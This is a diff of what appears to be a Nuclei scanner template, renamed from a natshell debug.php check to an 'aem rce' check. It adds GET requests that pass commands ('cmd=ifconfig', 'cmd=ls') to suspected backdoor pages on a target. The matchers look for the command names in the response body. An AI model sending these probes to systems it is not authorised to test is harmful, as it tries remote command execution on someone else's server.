@@ -1,7 +1,7 @@
-id: rce-debug-php
+id: rce-aem
 
 info:
-  name: natshell debug.php RCE
+  name: aem rce
   author: ELSFA7110
   severity: critical
   reference: https://twitter.com/sec715/status/1397924997457317897
@@ -10,13 +10,15 @@ info:
 requests:
   - method: GET
     path:
-      - "{{BaseURL}}/debug.php"
+      - "{{BaseURL}}/rcenode.html?cmd=ifconfig"
+      - "{{BaseURL}}/bin/backdoor.html?cmd=ls"
 
     matchers-condition: and
     matchers:
       - type: word
         words:
-          - "Command"
+          - "ifconfig"
+          - "ls"
         part: body
 
       - type: status
